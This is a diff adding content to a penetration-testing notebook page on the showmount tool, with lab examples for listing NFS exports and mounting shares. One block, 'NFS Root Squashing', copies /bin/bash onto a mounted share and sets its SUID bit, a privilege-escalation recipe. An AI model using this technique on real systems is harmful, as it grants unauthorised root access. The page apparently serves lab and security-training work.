@@ -9,6 +9,87 @@ hideFooterPagination: true
 
 {/* Generated from Commands/showmount.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## showmount: choose the operation and read the result
+
+List NFS exports when mountd is available.
+
+### What the result establishes
+
+Read advertised NFS exports and allowed clients as leads for a subsequent mount/access check.
+
+### Prerequisites and common failures
+
+NFSv4 behavior and server configuration can limit export listing; an advertised export is not proof this client can mount or read it.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+showmount -e TARGET_IP
+```
+
+### Example 2: 1. List the exports
+
+Run in: **Saved lab example**.
+
+```bash
+showmount -e <IP>          # -e = list exports; shows each share and its allowed clients
+```
+
+Saved context: [NFS Enumeration and Exports — 1. List the exports](/enumeration/nfs-enumeration-network-file-system#1-list-the-exports). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: NFS Root Squashing
+
+Run in: **Saved lab example**.
+
+```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash
+```
+
+Saved context: [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: NFS (Port 2049)
+
+Run in: **Saved lab example**.
+
+```bash
+# List available shares
+showmount -e <IP>
+
+# Mount a share
+mkdir /tmp/target-NFS
+sudo mount -t nfs <IP>:/<share> /tmp/target-NFS
+
+# Browse (use sudo — NFS permissions may block normal user)
+sudo ls -la /tmp/target-NFS/<folder>
+sudo cat /tmp/target-NFS/<folder>/file.txt
+
+# Unmount when done (important — stale mounts freeze your terminal)
+sudo umount -f /tmp/target-NFS
+sudo umount -l /tmp/target-NFS   # if -f doesn't work
+```
+
+Saved context: [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+List NFS exports when mountd is available.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=showmount) · [All tools](/index)
@@ -20,6 +101,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 showmount -e TARGET_IP
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 1: Commands](/enumeration/nfs-enumeration-network-file-system#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -52,6 +140,13 @@ sudo umount -f /tmp/target-NFS
 sudo umount -l /tmp/target-NFS   # if -f doesn't work
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049) · [NFS Enumeration and Exports — Example 4: NFS (Port 2049)](/enumeration/nfs-enumeration-network-file-system#example-4-nfs-port-2049)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="NFS Root Squashing">
@@ -78,6 +173,13 @@ cp /bin/bash .
 chmod +s bash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 3: NFS Root Squashing](/enumeration/nfs-enumeration-network-file-system#example-3-nfs-root-squashing) · [NFS Enumeration and Exports — Example 7: NFS Root Squashing](/enumeration/nfs-enumeration-network-file-system#example-7-nfs-root-squashing) · [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="1. List the exports">
@@ -89,6 +191,13 @@ chmod +s bash
 ```bash
 showmount -e <IP>          # -e = list exports; shows each share and its allowed clients
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 2: 1. List the exports](/enumeration/nfs-enumeration-network-file-system#example-2-1-list-the-exports) · [NFS Enumeration and Exports — 1. List the exports](/enumeration/nfs-enumeration-network-file-system#1-list-the-exports)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -104,6 +213,21 @@ Context from the notebook: First move showmount -e &lt;IP>  →  sudo mount -t n
 showmount -e <IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Quick reference](/enumeration/nfs-enumeration-network-file-system#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [NFS Enumeration and Exports](/enumeration/nfs-enumeration-network-file-system)
+
+{/* VAULT_RELATED_END */}
